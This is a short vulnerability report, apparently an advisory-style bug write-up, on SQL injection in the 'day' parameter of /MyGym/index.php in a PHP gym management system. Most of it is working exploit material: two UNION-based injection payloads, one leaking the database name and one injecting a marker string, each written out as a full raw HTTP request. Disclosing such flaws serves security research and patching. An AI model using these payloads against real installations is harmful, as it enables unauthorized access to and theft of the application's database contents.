# Gym Management System by pushpam02 has SQL injection
BUG_Author：Haerqi

vendors: https://www.sourcecodester.com/php/15515/gym-management-system-project-php.html

Vulnerability File: /MyGym/index.php?day=

Vulnerability location: /MyGym/index.php?day=, day

dbname = mygym

[+] Payload: day=1' union all select null,null,null,null,database(),null-- - // Leak place ---> day

```
GET /MyGym/index.php?day=1%27%20union%20all%20select%20null,null,null,null,database(),null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=8f610c644qbb1o5rqrul2l2d14
Connection: close
```

![image](https://github.com/Haerqi/sqlpic/blob/main/sqlDatabase.png)

[+] Payload: day=1' union all select null,null,null,null,CONCAT(0x61626364,0x51525354,0x71727374),null-- - // Leak place ---> day

```
GET /MyGym/index.php?day=1%27%20union%20all%20select%20null,null,null,null,CONCAT(0x61626364,0x51525354,0x71727374),null--%20- HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=8f610c644qbb1o5rqrul2l2d14
Connection: close
```

![image](https://github.com/Haerqi/sqlpic/blob/main/sqlConcat.png)


